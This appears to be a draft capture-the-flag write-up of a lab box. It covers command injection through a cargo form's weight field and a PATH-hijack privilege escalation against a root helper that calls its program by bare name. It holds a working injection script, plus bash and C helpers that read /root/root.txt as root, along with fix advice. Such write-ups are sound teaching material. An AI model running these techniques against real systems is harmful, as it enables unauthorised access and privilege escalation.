---
title: "Gulltown Ferry Manifest: A Weight Field, a Shell, and a Helper on the PATH"
date: 2026-10-16
draft: true
description: "A small cargo-manifest portal takes a shipment weight, does some maths with it, and hands the raw value to a shell on the way. That is the foothold. On the box, a root-owned manifest-stamp tool execs its helper by bare name, so a poisoned PATH turns a weighbridge into a root shell."
tags: ["CTF", "Web Exploitation", "Command Injection", "Linux Privilege Escalation", "PATH Hijack"]
categories: ["Web"]
authors: ["z3ro"]
---

<div class="dr-hero">
  <div class="dr-hero-top">
    <span class="dr-badge">Web</span>
    <span class="dr-badge cyan">Easy</span>
    <span class="dr-badge cyan">100 pts</span>
    <span class="dr-badge ghost">r00t CTF · Gulltown Ferry</span>
  </div>
  <div class="dr-title">GULLTOWN FERRY MANIFEST</div>
  <p class="dr-sub">Gulltown's ferry terminal runs a little web form to log cargo: a description, a <strong>weight</strong>, and some handling notes. The weight is meant to be a number. It is passed, unquoted, into a shell command — and the output is reflected straight back onto the page. From there it is one root-owned helper away from the flag.</p>
</div>

<div class="dr-stats">
  <div class="dr-stat"><span class="n red">1</span><span class="l">injectable field</span></div>
  <div class="dr-stat"><span class="n cyan">1</span><span class="l">root helper</span></div>
  <div class="dr-stat"><span class="n">PATH</span><span class="l">the weak link</span></div>
  <div class="dr-stat"><span class="n">root</span><span class="l">flag read</span></div>
</div>

## The form

The app is a single page with one POST endpoint:

```
POST /submit
  cargo_desc=    crates of preserved fish
  weight=        400
  handling_notes=
```

A normal submission comes back with a confirmation that reads like a receipt, and a line that says the cargo is **"within standard limits."** There is an automated-client notice below it. The page is friendly; the field handling is not.

![The Gulltown chain: a weight field into a shell, then a root helper off the PATH](/public/images/gulltown-ferry/00_chain.svg)

## Step 1 — The weight field reaches a shell

The first thing to try on any numeric field that ends up in a receipt is a shell metacharacter. The value `400` behaves. The value `x; id` does not:

```python
import requests, re, html

BASE = "http://172.16.0.15:5000"
S = requests.Session()

def clean(t):
    t = re.sub(r"<style.*?</style>", "", t, flags=re.S)
    t = re.sub(r"<script.*?</script>", "", t, flags=re.S)
    t = re.sub(r"<[^>]+>", "\n", t)
    return html.unescape(t)

def run(cmd, timeout=30):
    r = S.post(BASE + "/submit",
               data={"cargo_desc": "c", "weight": f"x; {cmd}", "handling_notes": ""},
               timeout=timeout)
    txt = clean(r.text)
    m = re.search(r"within standard limits\.\n(.*?)\n\n\n", txt, flags=re.S)
    return m.group(1).strip() if m else "[no output]"

print(run("id"))
print(run("ls -la /; whoami; hostname"))
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The output of every command lands between the "within standard limits." line and the automated-client notice. It is a full shell, running as `www-data`, with the results printed back into the page.

<div class="dr-callout danger">
  <span class="t">Root cause</span>
  <p>The weight is interpolated into a shell string instead of being parsed as a number. Something as simple as <code>echo "&lt;weight&gt;" | ...</code> with <code>shell=True</code> (or PHP's <code>shell_exec</code>, or a bare <code>system()</code>) is enough. The fix is to cast to a number, never to hand user input to a shell.</p>
</div>

## Step 2 — Looking for a way up

Enumeration from the `www-data` shell turns up a promising binary in the usual place for "helpful ops tooling":

```bash
ls -la /usr/local/bin/manifest-stamp; file /usr/local/bin/manifest-stamp
ls -la /opt/gulltown /opt/gulltown/bin
strings /usr/local/bin/manifest-stamp | head -60
```

Two facts matter. `manifest-stamp` lives in `/usr/local/bin` and is meant to stamp a manifest, and its supporting helper lives at `/opt/gulltown/bin/stamp-helper`. Crucially, `manifest-stamp` runs with **root** privilege (a setuid bit or a capability — the enumeration shows the mode) and, when it does its work, it executes its helper **by bare name**:

```
execvp("stamp-helper", ...)
```

`execvp` searches `PATH`. There is no absolute path and no sanitised environment. That is the whole privilege escalation.

<div class="dr-callout warn">
  <span class="t">Why bare names are dangerous in privileged tools</span>
  <p>Any setuid binary that calls <code>execvp</code>, <code>system</code>, or <code>popen</code> with an unqualified program name inherits the caller's <code>PATH</code>. If the caller can write to any directory on that path, the caller chooses which binary runs — as root.</p>
</div>

## Step 3 — Poisoning the PATH

We cannot write to `/opt/gulltown/bin`, but we do not need to. We create our own `stamp-helper` in a directory we control, prepend that directory to `PATH`, and invoke the privileged tool:

```bash
mkdir -p /tmp/ev
printf '#!/bin/bash\nid > /tmp/ev/pwn_id.txt\ncat /root/root.txt > /tmp/ev/pwn_flag.txt\nls -la /root > /tmp/ev/pwn_root.txt\n' \
  > /tmp/ev/stamp-helper
chmod 755 /tmp/ev/stamp-helper

PATH=/tmp/ev:$PATH manifest-stamp abc123

cat /tmp/ev/pwn_id.txt
cat /tmp/ev/pwn_flag.txt
```

When `manifest-stamp` calls `execvp("stamp-helper", ...)`, the lookup finds `/tmp/ev/stamp-helper` first. Our script runs as **root**, writes the id, copies down `/root/root.txt`, and lists `/root`. The same trick works with a compiled helper if bash is restricted:

```c
/* stamp.c — read the root flag from inside the hijacked helper */
#include <stdio.h>
int main(void) {
    FILE *f = fopen("/root/root.txt", "r");
    if (f) { int c; while ((c = fgetc(f)) != EOF) putchar(c); fclose(f); }
    printf("\neuid=%d\n", (int)geteuid());
    return 0;
}
```

```bash
gcc -o /tmp/ev/stamp-helper /tmp/ev/stamp.c && chmod 755 /tmp/ev/stamp-helper
PATH=/tmp/ev:$PATH manifest-stamp 262ad856
```

<div class="dr-callout warn">
  <span class="t">Flag captured on the live instance</span>
  <p>The root flag was read from <code>/root/root.txt</code> through this helper when the box was up. The instance is down now, so paste the real flag into the banner below when you publish.</p>
</div>

<div class="dr-flag">
  <span class="l">Flag</span>
  <code>r00t{&hellip;}</code>
</div>

## Root cause notes

Two independent bugs, stacked. Either one alone is serious.

- **Never build a shell string from user input.** Cast the weight to a number. If a shell is genuinely required, use an argument list (`subprocess.run([...], shell=False)`) so metacharacters have no meaning.
- **Privileged binaries must use absolute paths.** A root tool should `execv("/opt/gulltown/bin/stamp-helper", ...)`, and ideally drop privileges or sanitise `PATH`, `IFS`, and friends before doing anything.
- **PATH is attacker-controlled by default.** Treat it as untrusted input in any setuid/capability context. The helper lookup is the classic Linux privesc that keeps working because the tool is "just running a program".
